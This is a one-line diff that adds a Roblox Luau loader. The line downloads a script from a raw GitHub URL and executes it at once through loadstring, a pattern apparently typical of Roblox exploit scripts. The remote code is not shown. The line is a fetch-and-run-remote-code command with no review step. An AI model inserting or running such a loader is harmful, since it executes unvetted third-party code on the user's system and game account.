@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/18drsl-bot/dropkick/refs/heads/main/luau%20file'))()
